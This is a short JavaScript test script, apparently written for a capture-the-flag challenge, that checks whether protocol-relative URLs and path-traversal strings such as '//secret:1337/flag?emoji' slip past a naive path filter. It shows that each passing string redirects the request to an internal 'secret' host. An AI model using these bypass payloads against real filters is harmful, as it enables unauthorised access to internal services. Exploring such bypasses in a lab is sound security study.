// Test if protocol-relative URL bypasses the WAF

const waf = (path) => {
  if (typeof path !== "string") throw new Error("Invalid types");
  if (!path.startsWith("/")) throw new Error("Invalid 1");
  if (!path.includes("emoji")) throw new Error("Invalid 2");
  return path;
};

// Test cases
const testCases = [
  "/emoji/pizza",                          // Normal case
  "http://secret:1337/flag",               // Should fail (doesn't start with /)
  "//secret:1337/flag?emoji",              // Protocol-relative with emoji
  "//secret:1337/emoji/../flag",           // Protocol-relative with path traversal
];

console.log("Testing WAF bypasses:\n");

testCases.forEach(path => {
  try {
    waf(path);
    const url = new URL(path, "http://backend:3000");
    console.log(`✓ PASS: "${path}"`);
    console.log(`  → URL: ${url.toString()}`);
    console.log(`  → Host: ${url.host}\n`);
  } catch (err) {
    console.log(`✗ FAIL: "${path}"`);
    console.log(`  → Error: ${err.message}\n`);
  }
});